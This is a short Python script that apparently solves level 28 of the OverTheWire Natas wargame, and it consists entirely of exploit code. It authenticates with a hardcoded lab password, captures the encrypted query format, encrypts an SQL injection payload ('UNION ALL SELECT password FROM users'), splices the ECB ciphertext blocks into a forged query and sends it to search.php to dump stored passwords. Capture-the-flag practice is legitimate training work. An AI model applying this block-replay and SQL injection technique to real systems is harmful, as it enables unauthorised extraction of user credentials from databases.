import requests, base64

url = "http://natas28.natas.labs.overthewire.org"
s = requests.Session()
s.auth = ('natas28', 'JWwR438wkgTsNKBbcJoowyysdM82YjeF')

# get header and footer
data = {'query': 10 * ' '}
r = s.post(url, data=data)
baseline=requests.utils.unquote(r.url.split('=')[1])
baseline=base64.b64decode(baseline.encode('utf-8'))
header=baseline[:48]
footer=baseline[48:]

#1st part of replay attack: generate ciphertext query
sqli=9*' '+"' UNION ALL SELECT password FROM users;#"
data={'query':sqli}
r=s.post(url,data=data)
replay=requests.utils.unquote(r.url.split('=')[1])
replay=base64.b64decode(replay.encode('utf-8'))

#determine how many blocks are needed for the replay
nblocks = len(sqli) - 10#to align replay to head of block
while nblocks % 16 != 0:
    nblocks+=1
nblocks=int(nblocks/16)

#2nd part of replay attack: forge the query and get result
fake=header+replay[48:(48+16*nblocks)]+footer
fake_cipher=base64.b64encode(fake)
resp=s.get(url+'/search.php',params={'query':fake_cipher})

print(resp.text)
